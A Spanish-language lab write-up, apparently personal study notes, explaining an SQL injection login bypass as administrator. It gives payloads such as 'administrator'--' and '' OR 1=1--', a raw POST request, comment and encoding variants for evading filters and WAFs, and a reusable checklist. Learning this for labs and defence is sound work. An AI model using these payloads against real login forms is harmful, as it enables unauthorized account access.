 #labs #web #ejercicio
  
![[Pasted image 20250610212210.png]]

### ğŸ§ª ConfiguraciÃ³n del reto  
AplicaciÃ³n con formulario de **login** tÃ­pico:

```sql
SELECT * FROM users
 WHERE username = '%USERNAME%'
   AND password = '%PASSWORD%'
```

Objetivo: iniciar sesiÃ³n como **administrator** sin conocer la contraseÃ±a.

### â–¶ï¸ Pasos y payloads

| Campo        | Payload (plain)     | URLâ€‘encoded / comentarios | Notas                                                      |
| ------------ | ------------------- | ------------------------- | ---------------------------------------------------------- |
| **Username** | `administrator'--`  | `administrator%27--+`     | Cierra la comilla tras _administrator_ y comenta el resto. |
| **Password** | *(cualquier texto)* |                           | Ignorado por el comentario.                                |

Alternativa genÃ©rica si no conocemos usuarios:

| Campo        | Payload                      | ExplicaciÃ³n |
|--------------|------------------------------|-------------|
| Username     | `' OR 1=1--`                 | CondiciÃ³n siempre verdadera. |
| Password     | *(lo que sea)*               | ---         |

```text
POST /login HTTP/1.1
username=administrator'--&password=irrelevant
```

### ğŸ’¡ ExplicaciÃ³n paso a paso

1. **`administrator'`** â€“ Cierra la cadena que el servidor abriÃ³ con `'`.  
2. **`--`** â€“ Inicia comentario (MySQL/PostgreSQL) para anular `AND password = â€¦`.  
3. **Espacio tras `--`** â€“ Algunas BDs requieren Â«`-- `Â» (guionâ€‘guion + espacio).  
4. Resultado: la query se convierte en  
   ```sql
   SELECT * FROM users WHERE username = 'administrator'-- ' AND password = 'irrelevant'
   ```  
   devolviendo el registro del administrador â‡’ login exitoso.

> ğŸ› ï¸ *Si la BBDD usa `/* */` como comentario:*  
> `administrator'/*` tambiÃ©n funciona.

> ğŸ› ï¸ *Si la aplicaciÃ³n filtra caracteres:*  
> - Usa encodings (`%27`, `%2D%2D`)  
> - Prueba variantes como `#` (comentario en MySQL), `--+`, `--%0A`.

### ğŸ“Œ Resultado

* SesiÃ³n iniciada como **administrator**.  
* El laboratorio se marca como resuelto al acceder al panel de admin.

---

## ğŸ› ï¸ Checklist para bypass de login

1. **Detectar inyecciÃ³n** â€“ `'` produce error en login.  
2. **Decidir parÃ¡metro** â€“ username, password o ambos.  
3. **Insertar comentario** (`-- `, `#`, `/*`) para eliminar verificaciÃ³n de contraseÃ±a.  **(-- -)** ->comentario universal
4. **Mantener sintaxis correcta** (espacio despuÃ©s de `--`).  
5. **Probar encodings** si hay filtros WAF/IDS.  

> ğŸ’¬ *Tip:* guardar el payload como plantilla para usar con Burp Intruder en aplicaciones similares.
